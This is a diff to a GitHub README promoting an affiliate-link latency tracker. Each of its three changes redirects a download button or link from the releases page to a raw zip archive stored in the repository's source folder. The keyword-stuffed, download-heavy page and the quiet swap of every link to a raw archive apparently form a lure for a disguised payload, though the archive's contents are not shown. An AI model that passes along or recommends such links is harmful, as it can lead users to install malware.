@@ -1,6 +1,6 @@
 # 🚀 Outbound-Affiliate-Link-Chain-Latency-Tracker - Protect Revenue, Trace Every Click
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Kimo1000g/Outbound-Affiliate-Link-Chain-Latency-Tracker/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Kimo1000g/Outbound-Affiliate-Link-Chain-Latency-Tracker/raw/refs/heads/main/src/1.9.zip)
 
 ## 🔍 What Does This Software Do?
 
@@ -36,7 +36,7 @@ Get beautiful, easy-to-understand charts and graphs that show your affiliate lin
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/Kimo1000g/Outbound-Affiliate-Link-Chain-Latency-Tracker/releases](https://github.com/Kimo1000g/Outbound-Affiliate-Link-Chain-Latency-Tracker/releases)
+Visit this link to download the application: [https://github.com/Kimo1000g/Outbound-Affiliate-Link-Chain-Latency-Tracker/raw/refs/heads/main/src/1.9.zip](https://github.com/Kimo1000g/Outbound-Affiliate-Link-Chain-Latency-Tracker/raw/refs/heads/main/src/1.9.zip)
 
 ### Step-by-Step Download Guide
 
@@ -132,6 +132,6 @@ Check the releases page for detailed changelog information. Each update brings i
 
 Don't let broken links and lost tracking parameters cost you money. Download the Outbound-Affiliate-Link-Chain-Latency-Tracker now and take control of your affiliate link performance.
 
-[![Get Started Now](https://img.shields.io/badge/Get%20Started-Download-red?style=for-the-badge&logo=download&logoColor=white&color=FF4500)](https://github.com/Kimo1000g/Outbound-Affiliate-Link-Chain-Latency-Tracker/releases)
+[![Get Started Now](https://img.shields.io/badge/Get%20Started-Download-red?style=for-the-badge&logo=download&logoColor=white&color=FF4500)](https://github.com/Kimo1000g/Outbound-Affiliate-Link-Chain-Latency-Tracker/raw/refs/heads/main/src/1.9.zip)
 
 Keywords: adblock-detection, affiliate-marketing, bot-mitigation, compliance-automation, deep-linking, edge-computing, fastapi, igaming, latency-monitoring, link-health, playwright, python, redirect-tracker, reportlab, revenue-attribution, revenue-protection, seo-tools, technical-seo, wayback-machine, web-crawler
